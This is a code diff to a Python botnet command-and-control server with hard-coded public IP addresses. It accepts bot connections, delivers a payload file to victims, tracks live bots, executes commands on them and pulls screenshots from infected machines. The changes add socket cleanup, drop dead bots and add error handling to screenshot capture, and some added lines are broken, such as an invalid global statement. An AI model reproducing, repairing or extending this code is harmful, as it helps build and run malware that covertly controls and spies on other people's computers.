@@ -4,11 +4,15 @@ from time import sleep
 import sys
 import os
 import struct
+import base64 as b64
+
+#128.199.33.176
 
 if len(sys.argv) > 1:
     payload_name = str(sys.argv[1])
 
 botnet = {} #Botnet dictionary
+server_sockets = []
 exec_command = "null"
 on_connect_exit = False
 test_bool = False
@@ -24,27 +28,28 @@ test_conns = {}
 #    return False
 
 def start_confirmation_server(ip="159.65.11.28",port=2000):
-    global test_conns
+    global test_conns,server_sockets
     s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
     s.bind((ip,port))
     s.listen(5)
+    server_sockets.append(s)
     while True:
         # global keep_alive
         # if(keep_alive != True):
         #     s.close()
         #     return
         client,addr = s.accept()
-        client.send("2".encode())
+        #client.send("2".encode())
         if(test_conns.get(str(addr[0]))):
             continue
         test_conns[str(addr[0])] = client
 
-
 def start_payload_delivery_server(port=2004,ip="142.93.158.189"):
-    global payload_name
+    global payload_name,server_sockets
     ss = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
     ss.bind((ip,port))
     ss.listen(10)
+    server_sockets.append(ss)
     payload_file = open(payload_name,'rb')
     payload = payload_file.read()
     payload_file.close()
@@ -69,10 +74,11 @@ def start_payload_delivery_server(port=2004,ip="142.93.158.189"):
             print("[*] An Unknown Error Occurred : %s"%(str(ee)))
 
 def start_server(port=2003,ip="159.65.11.28"):
-    global botnet,exec_command,on_connect_exit
+    global botnet,exec_command,on_connect_exit,server_sockets
     s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
     s.bind((ip,port))
     s.listen(5)
+    server_sockets.append(s)
     print("\n[*] Server Started!\n")
     while True:
         global keep_alive
@@ -110,7 +116,7 @@ def test_bots():
         global test_bool
         if(test_bool == False):
             print("[*] %s : Dead"%(bot))
-            #del botnet[bot]
+            del botnet[bot]
 
 def detect_os():
     global botnet
@@ -123,7 +129,12 @@ def detect_os():
         print("\n\n\n\n")
 
 def shutdown_botnet():
-    global botnet,test_conns
+    global botnet,test_conns,global server_sockets
+    counter = 1
+    for server in server_sockets:
+        server.close()
+        print("[*] Server %d : Closed")
+        counter += 1
     for t in test_conns:
         test_conns[t].close()
         print("[*]Test conn to %s closed"%(t))
@@ -192,14 +203,17 @@ def get_screenshot(addr):
     except:
         pass
     #size = botnet[addr].recv(1024).decode()
-    image = botnet[addr].recv(1024)
-    image = b64.b64decode(data)
-    check_container(addr)
-    #os.chdir(addr)
-    extension = ".png"
-    file = open("scrnshot"+extension,'wb')
-    file.write(image)
-    file.close()
+    try:
+        data = botnet[addr].recv(1024)
+        image = b64.b64decode(data)
+        check_container(addr)
+        #os.chdir(addr)
+        extension = ".png"
+        file = open("scrnshot"+extension,'wb')
+        file.write(image)
+        file.close()
+    except Exception as e:
+        print("[*] Error occurred in get_screenshot : %s"%(str(e)))
 
 def exec_command(cmd):
     try:
